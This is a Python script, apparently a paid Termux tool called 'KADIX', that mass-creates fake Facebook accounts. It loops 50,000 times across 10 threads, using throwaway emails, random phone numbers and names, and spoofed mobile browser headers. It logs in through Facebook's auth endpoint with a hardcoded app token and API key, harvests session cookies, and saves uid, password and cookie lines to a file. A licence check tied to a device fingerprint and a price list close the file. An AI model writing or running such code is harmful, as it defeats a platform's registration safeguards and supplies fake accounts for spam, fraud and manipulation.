        from fake_email import Email
        mmail=Email().Mail()
        def rnd(a,b):
            return str(random.randint(a,b))
        em=mmail['mail']
        num="03"+rnd(10,49)+rnd(1111111,9999999)
        headers1 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url1 = 'https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk'
        data1 = None
        response1 = requests.get(url1, headers=headers1, data=data1)    
        headers2 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url2 = 'https://mbasic.facebook.com/reg/submit/'
        data2 = {
            'lsd': find(response1.text,"lsd"),
            'jazoest': find(response1.text,"jazoest"),
            'ccp': '2',
            'reg_instance': find(response1.text,"reg_instance"),
            'reg_impression_id': find(response1.text,"reg_impression_id"),
            'ns': '0',
            'app_id': find(response1.text,"app_id"),
            'logger_id': find(response1.text,"logger_id"),
            'suma_create_event': 'suma_redirection_click_create_account',
            'field_names[0]': 'firstname',
            'field_names[1]': 'birthday_wrapper',
            'field_names[2]': 'reg_email__',
            'field_names[3]': 'sex',
            'field_names[4]': 'reg_passwd__',
            'is_birthday_confirmed': 'confirmed',
            'multi_step_form': '1',
            'skip_suma': '0',
            'shouldForceMTouch': '1',
            'ref': 'dbl',
            'firstname': random.choice(m).split("|")[0]+" "+random.choice(m).split("|")[1],
            'reg_email__': num,
            'sex': '1',
            'reg_passwd__':pas,
            'birthday_day': rnd(10,27),
            'birthday_month': '3',
            'birthday_year': rnd(1978,1999),
            'welcome_step_completed': True,
            'submission_request': True,
            'age_step_input': False,
            'did_use_age': False,
            'custom_gender': False,
            'name_suggest_elig': False,
            'was_shown_name_suggestions': False,
            'did_use_suggested_name': False,
            'use_custom_gender': False,
            'zero_header_af_client': '',
            'helper': '',
            'guid': '',
            'pre_form_step': '',
            'korean_tos_is_present': '',
            'checkbox_privacy_policy': '',
            'checkbox_tos': '',
            'checkbox_location_policy': ''}
        response = requests.post(url2, headers=headers2, data=data2)
        response=requests.get("https://mbasic.facebook.com")
        if "checkpoint" in response.text:
            return "chk"
        headers = {'User-Agent': m2XD(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        for i in  re.findall('href="/changeemail(.*?)"',response.text):
          url="/changeemail"+i
        response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
        headers = {'Host': 'p.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
        data = {"adid": adid,
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "register_api",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "NO_FILE",
                    "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",}
        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
        submit = requests.post(url, headers=headers, data=data)
        r=requests.get("https://mbasic.facebook.com")
        while True:
            h=Email(mmail["session"]).inbox()
            if h:
                j = h['topic'].split('-')[1];hh = j.split(' ')[0]
                cd = hh
                break
        headers = {'Host': 'mbasic.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
        head = {
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
        url = 'https://m.facebook.com/confirmation_cliff/'
        response = requests.post(url, headers=headers, data=data)
        return requests
    def strt():
       try:
           global ok,loop,cp,ok1
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [KADIX-veux] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           hd = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/reg', 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent':random_ua()}
           if "9":
              pas=random.choice(m).replace('|','').lower()+rnd(1111,9999)
              requests=process(pas,mmail)
              if requests=="chk":
                cp+=1
                pass
              elif requests=="0":pass
              else:
                 dc=dict(requests.cookies)
                 cok=";".join([k+"="+v for k,v in dc.items()])
                 uid=re.findall("c_user=(.*?);",cok)[0]
                 coki = cvt('ok',requests.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
                 print("\r\r\033[1;32m [KADIX-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/KADIX/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    file="/sdcard"
    u=5000
    clear()
    print("   Auto Create Total Ids : 50000 ")
    linex()
    for i in range(50000):
       import time
       time.sleep(2)
       tpe(max_workers=10).submit(strt)

#<<_________[ KEY SETUP ]_________>>#
    try:
        curl.perform()
    except httpx.error as e:
        return f"Error: {e}"
    response = response_buffer.getvalue().decode('utf-8')
    curl.close()
    return response
def remove_symbols_and_spaces(input_string):
    cleaned_string = re.sub(r'[^A-Z0-5#]', '', input_string)
    return cleaned_string
def approval():
  clear()
  import platform
  uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
  id = remove_symbols_and_spaces(uuid)+"-KADIX"
  k1,k2,k3,k4=id[1:3],id[2:4],id[5:7],id[6:8]
  intuid=int(id.split("#")[0])
  pref=str((intuid-104729)*2-37+(1-2**7))
  suff=str((intuid-523217)%104729)
  realid=(suff+k3+k1+k4+k2+pref).encode().hex()
  try:
    httpCaht = get_response('https://github.com/KADIX03-T/KADIX/blob/main/apv.txt')
    if realid in httpCaht:
      loading() 
      clear() 
      print(f"{G} YOUR KEY APPROVED :\x1b[1;97m "+id)
      time.sleep(3)
      menu()
    else:
      loading() 
      clear() 
      print(f"{G} YOUR KEY NOT APPROVED :\x1b[1;97m "+id)
      linex()
      print(f'{G}\t     For Other Country User')
      linex()
      print(f'{A} 2$For 1 Days')
      print(f'{A} 5$ For 15 Days')
      print(f'{A} 10$ For 01 Month')
      print(f'{A} Payment Method Payeer')
      linex()
      print(f'{G}\t     For Algeria Country User')
      linex()
      print(f'{A} 180 Da For 1 Days')
      print(f'{A} 500 Da  For 15 Days')
      print(f'{A} 1000 Da For 01 Month')
      print(f'{G} Payment Method Easypaisa : {W} 03316010290')
      linex()
      print(f'{A} Get Approval For Premium Use')
      print(f'{A} Send Your Key To Admin')
      print(f'{A} And Get Approval')
      linex()
      input(f'{G} Press Enter')
      tks = ('Hello%20Abdou%20Sir%20!%20Please%20Approve%20My%20Kwy%20The%20Kwy%20Is%20:%20'+id);os.system('am start https://t.me/KADIXokpy');approval() 
      sys.exit()
      time.sleep(1)
      approval()
  except Exception as error:
    print(error)
if __name__=='__main__':
    menu() 
    try:
        os.system('touch .prox.txt')
    except:pass